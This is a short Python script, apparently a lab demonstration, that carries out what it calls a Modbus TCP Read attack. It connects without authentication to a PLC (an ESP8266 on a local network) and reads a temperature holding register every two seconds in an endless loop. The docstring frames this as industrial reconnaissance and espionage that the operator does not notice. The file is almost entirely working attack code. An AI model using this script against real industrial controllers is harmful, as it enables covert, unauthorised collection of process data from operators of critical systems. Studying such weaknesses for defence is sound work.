from pyModbusTCP.client import ModbusClient
import time

"""
===========================================================
Modbus TCP Read Attack – Industrial Reconnaissance
===========================================================

Description:
This script demonstrates a Modbus TCP Read attack targeting
the confidentiality of industrial data. The attacker connects
to a PLC (ESP8266) and continuously reads a holding register
containing sensor data, without authentication or authorization.

Attack Type:
- Reconnaissance / Industrial Espionage
- Targets: Confidentiality

Impact:
- Sensitive process data is leaked in real time
- The PLC and operator remain unaware of the attack
- No modification of the system behavior (passive attack)

Protocol Details:
- Protocol: Modbus TCP
- Function Code: 03 (Read Holding Registers)
- Target Register: Holding Register 0
- Data Read: Temperature value (°C)

This vulnerability exists because Modbus TCP does not provide
any authentication, access control, or encryption mechanisms.
"""

# -----------------------------------------------------------
# PLC Network Configuration
# -----------------------------------------------------------

PLC_IP = "192.168.1.137"     # IP address of the target PLC (ESP8266)
MODBUS_PORT = 502            # Standard Modbus TCP port

# -----------------------------------------------------------
# Modbus Client Initialization
# -----------------------------------------------------------

client = ModbusClient(
    host=PLC_IP,
    port=MODBUS_PORT,
    unit_id=1,
    auto_open=True
)

print("[*] Modbus TCP Read attack started")

# -----------------------------------------------------------
# Continuous Register Monitoring (Reconnaissance Phase)
# -----------------------------------------------------------

while True:
    # Read one holding register starting from address 0
    registers = client.read_holding_registers(0, 1)

    if registers:
        print("[+] Intercepted temperature:", registers[0], "°C")
    else:
        print("[-] Read failed: No response from PLC")

    # Delay between successive reads to avoid flooding the PLC
    time.sleep(2)
